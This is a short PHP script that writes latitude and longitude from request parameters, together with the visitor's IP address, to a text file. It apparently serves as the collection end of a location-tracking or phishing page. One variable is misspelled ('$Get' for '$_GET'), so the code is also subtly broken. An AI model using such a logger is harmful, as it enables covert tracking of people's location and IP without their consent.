<?php



$my_file = fopen("location.txt" ,"w" );
$information = "lat: " . $Get ["lat"] . "long" .$_GET ["long"] . "\nip:" . $_SERVER["REMOTE_ADDR"] ;
fwrite($my_file ,$information);
fclose($my_file);





?>